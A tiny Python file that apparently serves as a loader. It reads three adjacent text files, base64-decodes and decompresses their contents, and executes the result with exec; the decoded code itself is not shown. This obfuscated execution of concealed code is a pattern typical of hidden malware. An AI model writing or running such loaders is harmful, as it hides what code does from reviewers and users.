import zlib, base64
from pathlib import Path
_b = "".join(Path(__file__).with_name(f"_me{i}.txt").read_text().strip() for i in range(3))
exec(compile(zlib.decompress(base64.b64decode(_b)).decode(), str(Path(__file__).resolve()), "exec"), globals())
